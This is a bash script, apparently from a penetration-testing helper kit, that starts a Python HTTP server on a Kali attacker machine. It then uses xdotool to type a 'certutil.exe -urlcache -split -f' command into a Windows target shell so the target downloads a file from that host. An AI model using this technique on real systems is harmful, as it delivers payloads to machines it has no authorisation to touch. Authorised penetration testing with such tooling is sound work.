#!/bin/bash

certutil_download() {
    local url="$1"
    local location="$2"

    if [[ -z "$1" ||  -z "$2" ]]; then
        paste_command 'Usage: certutil_download "url" "location"'
        exit 1
    fi

    paste_command "certutil.exe -urlcache -split -f ${url} ${location}"
    xdotool key Return
    sleep 3
}

FILE_LOCATION=""
cmd_upload_file() {
    local location="${1}"
    local file="${2}"
    local time_to_life="${3:-60}"

    # Check for required arguments
    if [ -z "${location}" ] || [ -z "${file}" ]; then
        paste_command 'Usage: cmd_upload_file "location" "file"'
        exit 1
    fi

    # Generate GUI form items (label, type (optional: default text), name, default (optional))
    PYTHON_HTTP_PORT_FIELD=$(form_item "Python HTTP port" "number" "python_http_port" "1234")
    FILE_LOCATION_FIELD=$(form_item "file location" "file_location" "${file}")
    CREATE_FOLDER_FIELD=$(form_item "create folder location" "select" "create_folder" "no" "yes|no")

    # Generate GUI form
    generate_form "${PYTHON_HTTP_PORT_FIELD}" "${FILE_LOCATION_FIELD}" "${CREATE_FOLDER_FIELD}"

    PYTHON_HTTP_PORT=${form_data["python_http_port"]}
    FILE_LOCATION=${form_data["file_location"]}
    CREATE_FOLDER=${form_data["create_folder"]}

    if [[ "${CREATE_FOLDER}" == "yes" ]]; then
        # Verwijder eventuele trailing backslash
        TARGET_PATH="${FILE_LOCATION%\\}"

        # Als het pad een bestand bevat (punt + extensie), verwijder dan de bestandsnaam
        if [[ "${TARGET_PATH}" =~ \.[a-zA-Z0-9]+$ ]]; then
            TARGET_PATH="${TARGET_PATH%\\*}"  # Verwijdert het laatste deel (de bestandsnaam)
        fi

        # Haal de parent directory op (alles vóór de laatste backslash)
        PARENT_FOLDER="${TARGET_PATH%\\*}"

        # Haal de laatste component op (mapnaam die aangemaakt moet worden)
        FOLDER_NAME="${TARGET_PATH##*\\}"

        TMP_FOLDER="${PARENT_FOLDER}\\${FOLDER_NAME}"

        paste_command "if not exist ${TMP_FOLDER} mkdir ${TMP_FOLDER}"
        xdotool key Return
        sleep 0.8
    fi

    # start python server: location, python http port, TTL time (default: 60)
    start_python_server "${location}" "${PYTHON_HTTP_PORT}" "${time_to_life}"

    certutil_download "http://${KALI_IP}:${PYTHON_HTTP_PORT}/${file}" "${FILE_LOCATION}"

    # if location is without path add ./ prefix
    if [[ "${FILE_LOCATION}" == $(basename "${FILE_LOCATION}") ]]; then
        FILE_LOCATION="./${FILE_LOCATION}"
    fi
}
